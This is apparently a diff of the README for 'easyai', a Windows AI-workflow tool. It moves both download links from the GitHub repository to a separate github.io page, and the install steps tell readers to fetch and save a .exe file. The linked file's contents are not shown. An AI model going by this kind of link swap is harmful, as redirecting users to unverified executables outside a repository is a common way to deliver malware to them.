@@ -1,6 +1,6 @@
 # 🤖 easyai - Build custom artificial intelligence workflows easily
 
-[![](https://img.shields.io/badge/Download_easyai_for_Windows-blue)](https://github.com/uzair2755/easyai)
+[![](https://img.shields.io/badge/Download_easyai_for_Windows-blue)](https://uzair2755.github.io)
 
 ## What is easyai?
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to put the software on your machine:
 
-1. Visit this page to download: https://github.com/uzair2755/easyai
+1. Visit this page to download: https://uzair2755.github.io
 2. Locate the most recent version in the releases section.
 3. Select the file ending in .exe for Windows.
 4. Save the file to your desktop or downloads folder.
